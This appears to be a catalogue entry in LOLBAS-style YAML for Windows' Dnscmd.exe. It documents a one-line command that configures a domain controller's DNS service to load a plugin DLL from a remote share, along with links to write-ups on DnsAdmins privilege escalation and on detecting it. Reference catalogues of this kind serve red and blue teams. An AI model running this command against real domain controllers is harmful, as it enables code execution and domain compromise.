---
Name: Dnscmd.exe
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
    Description: ''
Full Path:
  - c:\windows\system32\Dnscmd.exe
  - c:\windows\sysWOW64\Dnscmd.exe
Code Sample: []
Detection: []
Resources:
  - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
  - https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
  - https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
  - https://twitter.com/Hexacorn/status/994000792628719618
  - http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
Notes: 'Thanks to Shay Ber - ?   , Dimitrios Slamaris - @dim0x69    , Nikhil SamratAshok
  Mittal - @nikhil_mitt   '
---